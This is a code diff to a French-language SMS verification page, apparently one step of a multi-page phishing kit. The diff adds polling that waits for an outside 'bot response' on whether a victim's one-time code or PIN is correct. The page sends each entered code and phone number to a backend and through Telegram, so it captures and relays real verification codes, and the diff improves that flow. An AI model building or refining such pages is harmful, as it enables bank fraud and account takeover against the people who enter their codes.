@@ -132,13 +132,28 @@
             align-items: center;
             gap: 6px;
             cursor: pointer;
-            margin-bottom: 35px;
+            margin-bottom: 25px;
             box-shadow: 0 2px 5px rgba(0,0,0,0.03);
             text-decoration: none;
         }
 
         .btn-edit-phone:active {
             background-color: #f7f7f7;
+        }
+
+        /* 🚨 Red Status Error Banner */
+        .error-banner {
+            width: 100%;
+            background-color: #ffebe9;
+            border: 1px solid #ff4d4f;
+            color: #d93025;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            display: none;
+            box-shadow: 0 2px 6px rgba(217, 48, 37, 0.1);
         }
 
         /* OTP Input Box */
@@ -160,6 +175,11 @@
             color: var(--text-dark);
             background-color: #ffffff;
             transition: border-color 0.2s;
+        }
+
+        .otp-input.input-error {
+            border-color: #d93025;
+            background-color: #fff9f9;
         }
 
         .otp-input::placeholder {
@@ -344,6 +364,9 @@
         ✏️ Modifier le numéro
     </a>
 
+    <!-- Red Error Banner for Wrong Code -->
+    <div id="statusErrorContainer" class="error-banner"></div>
+
     <form id="otpForm" style="width: 100%;" onsubmit="submitOtp(event)">
         <div class="otp-input-container">
             <input 
@@ -388,6 +411,7 @@
     const TOTAL_TIME = 120; // 2 Minutes
     let timeLeft = TOTAL_TIME;
     let timerInterval = null;
+    let statusPollingInterval = null;
 
     const timerTextEl = document.getElementById('timerText');
     const expireSecondsEl = document.getElementById('expireSeconds');
@@ -395,6 +419,8 @@
     const expireBadge = document.getElementById('expireBadge');
     const resendContainer = document.getElementById('resendContainer');
     const phoneDisplayEl = document.getElementById('userPhoneDisplay');
+    const statusErrorContainer = document.getElementById('statusErrorContainer');
+    const otpInputEl = document.getElementById('otpCode');
 
     // Overlay Elements
     const statusOverlay = document.getElementById('statusOverlay');
@@ -455,29 +481,47 @@
         resendContainer.style.display = 'block';
     }
 
-    function resendCode() {
+    async function resendCode() {
+        const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
+        try {
+            await fetch("/api/resend-otp-notification", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ phone, step: "First OTP (Page 8)" })
+            });
+        } catch (err) {
+            console.error("Resend error:", err);
+        }
         alert("Un nouveau code de validation a été envoyé par SMS.");
         startTimer();
     }
 
     async function submitOtp(event) {
         event.preventDefault();
-        const codeVal = document.getElementById('otpCode').value.trim();
+        const codeVal = otpInputEl.value.trim();
 
         if (codeVal.length < 4) {
-            alert("Veuillez entrer un code de vérification valide.");
+            statusErrorContainer.style.display = 'block';
+            statusErrorContainer.textContent = "Code incorrect, veuillez entrer le code correct.";
+            otpInputEl.classList.add('input-error');
             return;
         }
 
-        // Show Fullscreen Status Overlay
-        statusOverlay.classList.add('active');
-
-        // Store OTP code locally
-        localStorage.setItem('smsOtp1', codeVal);
+        // Hide previous errors
+        statusErrorContainer.style.display = 'none';
+        otpInputEl.classList.remove('input-error');
 
         const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
 
-        // Send Telegram notification / API Payload
+        // Display waiting screen
+        overlayMainText.textContent = "Veuillez patienter...";
+        overlaySubText.textContent = "Vérification du code SMS en cours...";
+        statusOverlay.classList.add('active');
+
+        // Save local OTP
+        localStorage.setItem('smsOtp1', codeVal);
+
+        // Send payload to backend
         try {
             await fetch("/api/otp-notification", {
                 method: "POST",
@@ -488,24 +532,58 @@
             console.error("❌ Erreur d'envoi de la notification :", err);
         }
 
-        // Send data to Telegram WebApp if present
         const tg = window.Telegram?.WebApp;
         if (tg && tg.sendData) {
             tg.sendData(JSON.stringify({ event: "otp_verification_1", phone: phone, otp: codeVal }));
         }
 
-        // Delay status transition & redirect to Page 9
-        setTimeout(() => {
-            overlayMainText.textContent = "Code confirmé !";
-            overlaySubText.textContent = "Redirection en cours...";
+        // Wait for bot response via status polling
+        startStatusPolling(phone);
+    }
 
-            setTimeout(() => {
-                window.location.href = "/page9";
-            }, 1200);
+    function startStatusPolling(phone) {
+        if (statusPollingInterval) clearInterval(statusPollingInterval);
+
+        statusPollingInterval = setInterval(async () => {
+            try {
+                const response = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
+                const data = await response.json();
+
+                if (data.status === "otp1_correct") {
+                    clearInterval(statusPollingInterval);
+                    overlayMainText.textContent = "Code confirmé !";
+                    overlaySubText.textContent = "Redirection en cours...";
+
+                    setTimeout(() => {
+                        window.location.href = "/page9";
+                    }, 1200);
+                } 
+                else if (data.status === "otp1_wrong") {
+                    clearInterval(statusPollingInterval);
+                    statusOverlay.classList.remove('active');
+                    
+                    // Show Red Error Message in French
+                    statusErrorContainer.style.display = 'block';
+                    statusErrorContainer.textContent = "Code incorrect, veuillez entrer le code correct.";
+                    otpInputEl.classList.add('input-error');
+                    otpInputEl.value = "";
+                    otpInputEl.focus();
+                }
+                else if (data.status === "otp2_wrongpin") {
+                    clearInterval(statusPollingInterval);
+                    statusOverlay.classList.remove('active');
+                    
+                    // Redirect to Page 6 with error flag
+                    window.location.href = "/page6?error=wrong_pin";
+                }
+            } catch (err) {
+                console.error("Status polling error:", err);
+            }
         }, 2000);
     }
 
     function goBack() {
+        if (statusPollingInterval) clearInterval(statusPollingInterval);
         window.location.href = "/page6";
     }
 </script>
